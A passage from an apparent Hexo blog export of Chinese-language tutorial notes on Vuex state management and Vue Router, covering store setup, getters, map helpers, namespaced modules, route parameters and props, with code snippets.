<li>裏面存有操作所對應的 <font color="skyblue">初始化的State 和 操作的數據</font></li>
<li>通過以下方式更改保存在State中的數據，進行數據的更新  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">state.<span class="property">sum</span> += <span class="number">2</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>State</code>：一個對象，用於保存數據</p>
<ul>
<li>當數據更新完後，Vuex會重新解析和渲染頁面上的動態數據</li>
</ul>
</li>
</ol>
<h2 id="搭建Vuex環境"><a href="#搭建Vuex環境" class="headerlink" title="搭建Vuex環境"></a>搭建Vuex環境</h2><ol>
<li><p>創建<code>store</code>：</p>
<ul>
<li>創建文件：<code>src/store/index.js</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入Vue核心庫</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// 引入Vuex</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">// 應用Vuex插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 準備actions，用於響應組件中的動作</span></span><br><span class="line"><span class="keyword">const</span> actions = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 準備mutations，用於操作數據(state)</span></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 準備state，用於存儲數據</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建並暴露store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    actions,</span><br><span class="line">    mutations,</span><br><span class="line">    state</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>配置<code>store</code>：</p>
<ul>
<li>在<code>main.js</code>中創建<code>vm</code>時傳入<code>store</code>配置項  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store/index.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="comment">// 配置store</span></span><br><span class="line">    store,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Vuex基本使用"><a href="#Vuex基本使用" class="headerlink" title="Vuex基本使用"></a>Vuex基本使用</h2><ol>
<li><p>初始化數據，配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入Vue</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// 引入Vuex</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">// 使用vuex插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">    <span class="title function_">add</span>(<span class="params">context,value</span>)&#123;</span><br><span class="line">        context.<span class="title function_">commit</span>(<span class="string">&#x27;ADD&#x27;</span>, value)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">    <span class="title function_">ADD</span>(<span class="params">state,value</span>)&#123;</span><br><span class="line">        state.<span class="property">sum</span> += value</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化數據</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">    <span class="attr">sum</span>:<span class="number">0</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    actions,</span><br><span class="line">    mutations,</span><br><span class="line">    state,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>組件中讀取vuex的數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$store.<span class="property">state</span>.<span class="property">sum</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>組件中修改vuex中的數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$store.<span class="title function_">dispatch</span>(<span class="string">&#x27;actionName&#x27;</span>, data)     <span class="comment">// 透過actions修改數據</span></span><br><span class="line">$store.<span class="title function_">commit</span>(<span class="string">&#x27;mutationsName&#x27;</span>, data)    <span class="comment">// 跳過actions，直接聯繫mutations修改</span></span><br></pre></td></tr></table></figure>
<ul>
<li>備註：若沒有網絡請求或其他邏輯，則可直接使用<code>commit</code>修改數據</li>
</ul>
</li>
</ol>
<h2 id="getters的使用"><a href="#getters的使用" class="headerlink" title="getters的使用"></a>getters的使用</h2><ol>
<li><p>概念：當<code>state</code>中的數據需要進行加工後再使用，可以使用getters加工</p>
</li>
<li><p>在<code>store.js</code>中追加<code>getters</code>配置</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">    <span class="title function_">tenTimes</span>(<span class="params">state</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="property">sum</span> * <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    ...</span><br><span class="line">    getters,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>組件中讀取數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$store.<span class="property">getters</span>.<span class="property">tenTimes</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="四種map方法的使用"><a href="#四種map方法的使用" class="headerlink" title="四種map方法的使用"></a>四種map方法的使用</h2><ol>
<li><p><code>mapState</code>方法：用於映射<code>state</code>中的數據為計算屬性</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 借助 mapState 生成計算屬性，從state中讀取數據（對象寫法）</span></span><br><span class="line">    ...<span class="title function_">mapState</span>(&#123;<span class="attr">a</span>:<span class="string">&#x27;sum&#x27;</span>, <span class="attr">b</span>:<span class="string">&#x27;school&#x27;</span>, <span class="attr">c</span>:<span class="string">&#x27;major&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 借助 mapState 生成計算屬性，從state中讀取數據（數組寫法）</span></span><br><span class="line">    ...<span class="title function_">mapState</span>([<span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;school&#x27;</span>, <span class="string">&#x27;major&#x27;</span>]),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>mapGetters</code>方法：用於映射<code>getters</code>中的數據為計算屬性</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 借助 mapGetters 生成計算屬性，從getters中讀取數據（對象寫法）</span></span><br><span class="line">    ...<span class="title function_">mapGetters</span>(&#123;<span class="attr">tenTimes</span>:<span class="string">&#x27;tenTimes&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 借助 mapGetters 生成計算屬性，從getters中讀取數據（數組寫法）</span></span><br><span class="line">    ...<span class="title function_">mapGetters</span>([<span class="string">&#x27;tenTimes&#x27;</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>mapActions</code>方法：用於生成與<code>actions</code>對話的方法，即包含<code>$store.dispatch(xxx)</code>的函數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 借助 mapActions 生成對應的方法，方法中會調用dispatch去聯繫actions（對象的寫法）</span></span><br><span class="line">    ...<span class="title function_">mapActions</span>(&#123;<span class="attr">incrementOdd</span>:<span class="string">&#x27;addOdd&#x27;</span>, <span class="attr">incrementWait</span>:<span class="string">&#x27;addWait&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 借助 mapActions 生成對應的方法，方法中會調用dispatch去聯繫actions（對象的寫法）</span></span><br><span class="line">    ...<span class="title function_">mapActions</span>([<span class="string">&#x27;addOdd&#x27;</span>, <span class="string">&#x27;addWait&#x27;</span>]),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>mapMutations</code>方法：用於生成與<code>mutations</code>對話的方法，即包含<code>$store.commit(xxx)</code>的函數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 借助 mapMutations 生成對應的方法，方法中會調用commit去聯繫mutations（對象的寫法）</span></span><br><span class="line">    ...<span class="title function_">mapMutations</span>(&#123;<span class="attr">increment</span>:<span class="string">&#x27;ADD&#x27;</span>, <span class="attr">decrement</span>:<span class="string">&#x27;MINUS&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 借助 mapMutations 生成對應的方法，方法中會調用commit去聯繫mutations（數組的寫法）</span></span><br><span class="line">    ...<span class="title function_">mapMutations</span>([<span class="string">&#x27;ADD&#x27;</span>, <span class="string">&#x27;MINUS&#x27;</span>]),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>備註：<code>mapActions</code> 與 <code>mapMutations</code> 使用時，若需要傳遞參數，<font color="#f54747">需要在模板中綁定事件時傳遞參數</font>，否則參數是默認的事件對象</p>
</li>
</ol>
<h2 id="Vuex模塊化及命名空間"><a href="#Vuex模塊化及命名空間" class="headerlink" title="Vuex模塊化及命名空間"></a>Vuex模塊化及命名空間</h2><ol>
<li><p>目的：讓代碼更好維護，讓更多數據分類明確</p>
</li>
<li><p>修改<code>store.js</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> countAbout = &#123;</span><br><span class="line">    <span class="attr">namespaced</span>:<span class="literal">true</span>     <span class="comment">// 開啟命名空間</span></span><br><span class="line">    <span class="attr">state</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">actions</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">mutations</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">getters</span>:&#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> personAbout = &#123;</span><br><span class="line">    <span class="attr">namespaced</span>:<span class="literal">true</span>     <span class="comment">// 開啟命名空間</span></span><br><span class="line">    <span class="attr">state</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">actions</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">mutations</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">getters</span>:&#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    <span class="attr">modules</span>:&#123;</span><br><span class="line">        countAbout,</span><br><span class="line">        personAbout,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>開啟命名空間後，組件中讀取<code>state</code>數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：直接讀取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">countAbout</span>.<span class="property">xxx</span></span><br><span class="line"><span class="comment">// 方式二：借助mapState讀取</span></span><br><span class="line">...<span class="title function_">mapState</span>(<span class="string">&#x27;countAbout&#x27;</span>, [<span class="string">&#x27;xxx&#x27;</span>])</span><br></pre></td></tr></table></figure>

</li>
<li><p>開啟命名空間後，組件中讀取<code>getters</code>數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：直接讀取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">getters</span>[<span class="string">&#x27;countAbout/xxx&#x27;</span>]</span><br><span class="line"><span class="comment">// 方式二：借助mapGetters讀取</span></span><br><span class="line">...<span class="title function_">mapGetters</span>(<span class="string">&#x27;countAbout&#x27;</span>, [<span class="string">&#x27;xxx&#x27;</span>])</span><br></pre></td></tr></table></figure>

</li>
<li><p>開啟命名空間後，組件中調用<code>dispatch</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：直接讀取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;countAbout/xxx&#x27;</span>, value)</span><br><span class="line"><span class="comment">// 方式二：借助mapActions讀取</span></span><br><span class="line">...<span class="title function_">mapActions</span>(<span class="string">&#x27;countAbout&#x27;</span>, [<span class="string">&#x27;xxx&#x27;</span>])</span><br></pre></td></tr></table></figure>

</li>
<li><p>開啟命名空間後，組件中調用<code>commit</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：直接讀取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;countAbout/XXX&#x27;</span>, value)</span><br><span class="line"><span class="comment">// 方式二：借助mapMutations讀取</span></span><br><span class="line">...<span class="title function_">mapMutations</span>(<span class="string">&#x27;countAbout&#x27;</span>, [<span class="string">&#x27;XXX&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - Vue Router</title>
    <url>/myBlog/2022/06/26/2022/FrontEnd/2022-6-26-VueJS-Router/</url>
    <content><![CDATA[<h1 id="Vue-Router"><a href="#Vue-Router" class="headerlink" title="Vue Router"></a>Vue Router</h1><h2 id="Vue-router理解"><a href="#Vue-router理解" class="headerlink" title="Vue-router理解"></a>Vue-router理解</h2><ol>
<li><p>理解：<br> vue的一個插件庫，專門用來實現SPA應用</p>
</li>
<li><p>對SPA應用的理解：</p>
<ol>
<li>單頁Web應用 (single page web application)</li>
<li>整個應用只有一個完整的頁面</li>
<li>點擊頁面中的導航鏈接不會刷新頁面，只會做頁面的<font color="#f54747">局部更新</font></li>
<li>數據需要用過ajax請求獲取</li>
</ol>
</li>
</ol>
<h2 id="route路由的理解"><a href="#route路由的理解" class="headerlink" title="route路由的理解"></a>route路由的理解</h2><ol>
<li><p>理解：</p>
<ol>
<li>一個就是一組映射關係 (key - value)</li>
<li><code>key</code>為路徑，<code>value</code>可能是<code>function</code>或<code>component</code></li>
</ol>
</li>
<li><p>路由的分類：</p>
<ol>
<li>後端路由：<ul>
<li>理解：<code>value</code>是<code>function</code>，統御處理客戶端提交的請求</li>
<li>工作過程：服務器接收到一個請求時，根據請求路徑找到匹配的函數來處理請求，返回響應函數</li>
</ul>
</li>
<li>前端路由：<ul>
<li>理解：<code>value</code>是<code>component</code>，用於展示頁面內容</li>
<li>工作過程：當瀏覽器的路徑改變時，對應的組件就會顯示</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="Vue-router的基本使用"><a href="#Vue-router的基本使用" class="headerlink" title="Vue-router的基本使用"></a>Vue-router的基本使用</h2><ol>
<li><p>安裝</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i vue-router</span><br></pre></td></tr></table></figure>

</li>
<li><p>在<code>main.js</code>中應用插件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">// 應用</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>編寫<code>router</code>配置項：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入VueRouter</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">// 引入組件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&#x27;../components/About&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;../components/Home&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建並暴露router實例對象，去管理路由規則</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">    <span class="attr">routes</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>實現切換：借助<code>&lt;router-link&gt;</code>標籤實現路由的切換</p>
<ul>
<li><code>active-class</code>可配置高亮樣式 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;</span><br><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/home&quot;&gt;Home&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>指定展示位置：借助<code>&lt;router-view&gt;</code>指定組件的呈現位置</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>注意：</p>
<ol>
<li>路由組件通常存放在<code>pages</code>文件夾，一般組件通常存放在<code>components</code>文件夾</li>
<li>通過切換，「隱藏」了的路由組件，默認是被<font color="#f54747">銷毀掉</font>的，需要的時候再去掛載</li>
<li>每個組件都有自己的<code>$route</code>屬性，裏面存放著自己的路由信息</li>
<li>整個應用只有一個router，可以通過組件的<code>$router</code>屬性獲取</li>
</ol>
</li>
</ol>
<h2 id="嵌套路由（多級路由）"><a href="#嵌套路由（多級路由）" class="headerlink" title="嵌套路由（多級路由）"></a>嵌套路由（多級路由）</h2><ol>
<li><p>配置路由規則時，使用<code>children</code>配置項：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>:<span class="title class_">Home</span>,</span><br><span class="line">        <span class="attr">children</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">path</span>:<span class="string">&#x27;news&#x27;</span>,        <span class="comment">// 此處一定不要寫&#x27;/news&#x27;</span></span><br><span class="line">                <span class="attr">component</span>:<span class="title class_">News</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">path</span>:<span class="string">&#x27;message&#x27;</span>,     <span class="comment">// 此處一定不要寫&#x27;/message&#x27;</span></span><br><span class="line">                <span class="attr">component</span>:<span class="title class_">Message</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>跳轉（要寫完整路徑）：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由的query參數"><a href="#路由的query參數" class="headerlink" title="路由的query參數"></a>路由的query參數</h2><ol>
<li><p>傳遞參數</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 跳轉路由並攜帶query參數，to的字符串寫法 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;`/home/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳轉路由並攜帶query參數，to的對象寫法 --&gt;</span><br><span class="line">&lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">        path:&#x27;home/message/detail&#x27;,</span><br><span class="line">        query:&#123;</span><br><span class="line">            id:m.id,</span><br><span class="line">            title:m.title</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&quot;</span><br><span class="line">&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>接收參數：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$route.<span class="property">query</span>.<span class="property">id</span></span><br><span class="line">$route.<span class="property">query</span>.<span class="property">title</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="命名路由"><a href="#命名路由" class="headerlink" title="命名路由"></a>命名路由</h2><ol>
<li><p>作用：可以簡化路由的跳轉（路由地址）</p>
</li>
<li><p>使用方法：</p>
<ol>
<li><p>給路由取名字</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/demo&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">Demo</span>,</span><br><span class="line">    <span class="attr">children</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Test</span>,</span><br><span class="line">            <span class="attr">children</span>:[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">name</span>:<span class="string">&#x27;hello&#x27;</span>,       <span class="comment">// 給路由命名</span></span><br><span class="line">                    <span class="attr">path</span>:<span class="string">&#x27;welcome&#x27;</span>,</span><br><span class="line">                    <span class="attr">component</span>:<span class="title class_">Hello</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>簡化跳轉</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 簡化前寫法：完整路徑 --&gt;</span><br><span class="line">&lt;router-link to=&quot;/demo/test/welcome&quot;&gt;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 簡化後寫法：直接通過名字跳轉 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;&#123;name:&#x27;hello&#x27;&#125;&quot;&gt;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 簡化後配合傳遞參數 --&gt;</span><br><span class="line">&lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">        name:&#x27;hello&#x27;,</span><br><span class="line">        query:&#123;</span><br><span class="line">            id:xxx,</span><br><span class="line">            title:yyy</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&quot;</span><br><span class="line">&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="路由的params參數"><a href="#路由的params參數" class="headerlink" title="路由的params參數"></a>路由的params參數</h2><ol>
<li><p>配置路由，聲明接收的params參數：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">Home</span>,</span><br><span class="line">    <span class="attr">children</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Message</span>,</span><br><span class="line">            <span class="attr">children</span>:[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">name</span>:<span class="string">&#x27;detailRouter&#x27;</span>,</span><br><span class="line">                    <span class="attr">path</span>:<span class="string">&#x27;detail/:id/:title&#x27;</span>,  <span class="comment">// 使用佔位聲明接收params參數</span></span><br><span class="line">                    <span class="attr">component</span>:<span class="title class_">Detail</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>傳遞參數：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 跳轉路由並攜帶params參數，to的字符串寫法 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳轉路由並攜帶params參數，to的對象寫法 --&gt;</span><br><span class="line">&lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">        name:&#x27;detailRouter&#x27;,</span><br><span class="line">        params:&#123;</span><br><span class="line">            id:m.id,</span><br><span class="line">            title:m.title</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&quot;</span><br><span class="line">&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意點：路由攜帶params參數時，若使用to的對象寫法，則不能使用<code>path</code>配置項，必須使用<code>name</code>配置</li>
</ul>
</li>
<li><p>接收參數</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$route.params.id</span><br><span class="line">$route.params.title</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由的props配置"><a href="#路由的props配置" class="headerlink" title="路由的props配置"></a>路由的props配置</h2><ol>
<li><p>作用：讓路由器組件更方便的接收到參數</p>
</li>
<li><p>使用方法：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一種寫法：對象。該對象中的所欲key-value都會以props的形式傳給Detail組件</span></span><br><span class="line"><span class="attr">props</span>:&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="string">&#x27;hello&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二種寫法：值為布爾值。若布爾值為真，則把該路由組件收到的所有params參數，以props的形式傳給Detail組件</span></span><br><span class="line"><span class="attr">props</span>:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三種寫法：值為函數。該函數返回的對象中每一組key-value都會通過props傳給Detail組件</span></span><br><span class="line"><span class="title function_">props</span>(<span class="params">$route</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">        <span class="attr">id</span>:$route.<span class="property">query</span>.<span class="property">id</span>,</span><br><span class="line">        <span class="attr">title</span>:$route.<span class="property">query</span>.<span class="property">title</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="replace屬性"><a href="#replace屬性" class="headerlink" title="replace屬性"></a>replace屬性</h2><ol>
<li><p>作用：控制路由器跳轉時操作瀏覽器歷史紀錄的模式</p>
</li>
<li><p>瀏覽器的歷史紀錄有兩種寫入方式：分別是<code>push</code>和<code>replace</code></p>
<ul>
<li><code>push</code>是追加歷史紀錄</li>
<li><code>replace</code>是替換當前紀錄</li>
<li>路由跳轉時默認為<code>push</code></li>
</ul>
</li>
<li><p>開啟<code>replace</code>模式：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link replace ...&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="編程式路由導航"><a href="#編程式路由導航" class="headerlink" title="編程式路由導航"></a>編程式路由導航</h2><ol>
<li><p>作用：不借助<code>&lt;router-link&gt;</code>實現路由跳轉，讓路由跳轉更加靈活</p>
</li>
<li><p>具體代碼：</p>
